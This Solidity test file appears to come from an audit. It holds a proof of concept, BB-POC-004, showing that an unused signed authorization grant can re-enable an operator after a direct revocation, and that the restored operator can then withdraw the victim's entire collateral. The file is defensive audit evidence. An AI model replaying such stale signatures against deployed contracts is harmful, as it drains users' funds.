// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.34;

import {Config} from "../../Config.t.sol";
import {
    Authorization,
    Signature,
    AUTHORIZATION_TYPEHASH,
    EIP712_DOMAIN_TYPEHASH
} from "../../../../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

/// @dev BB-POC-004 — an unused signed grant can restore an operator after a direct core revocation.
/// This overlaps acknowledged operator-disable risk and is retained as duplicate-risk evidence.
contract PoCBlackboxAuthorizationIntentSplitTest is Config {
    uint256 internal constant AUTHOR_KEY = 0xA110CE;
    uint256 internal constant COLLATERAL = 10e18;

    function testBlackbox_UnusedSignedGrantCanRestoreOperatorAfterDirectRevocation() public {
        address authorizer = vm.addr(AUTHOR_KEY);
        address operator = ATTACKER;

        vm.prank(authorizer);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, authorizer);

        deal(address(collateralToken1), authorizer, COLLATERAL);
        vm.startPrank(authorizer);
        collateralToken1.approve(address(midnight), COLLATERAL);
        midnight.supplyCollateral(market, 0, COLLATERAL, authorizer);
        midnight.setIsAuthorized(operator, true, authorizer);
        vm.stopPrank();

        Authorization memory grant = Authorization({
            authorizer: authorizer,
            authorized: operator,
            isAuthorized: true,
            nonce: ecrecoverAuthorizer.nonce(authorizer),
            deadline: block.timestamp + 1 days
        });
        Signature memory sig = _sign(grant);

        vm.prank(authorizer);
        midnight.setIsAuthorized(operator, false, authorizer);
        assertFalse(midnight.isAuthorized(authorizer, operator), "operator was directly revoked");

        vm.prank(operator);
        ecrecoverAuthorizer.setIsAuthorized(grant, sig);
        assertTrue(midnight.isAuthorized(authorizer, operator), "stale unused signature restores operator");

        uint256 attackerBefore = collateralToken1.balanceOf(operator);
        vm.prank(operator);
        midnight.withdrawCollateral(market, 0, COLLATERAL, authorizer, operator);
        assertEq(
            collateralToken1.balanceOf(operator), attackerBefore + COLLATERAL, "restored operator drains collateral"
        );
    }

    function _sign(Authorization memory authorization) internal view returns (Signature memory sig) {
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator =
            keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, structHash));
        (sig.v, sig.r, sig.s) = vm.sign(AUTHOR_KEY, digest);
    }
}
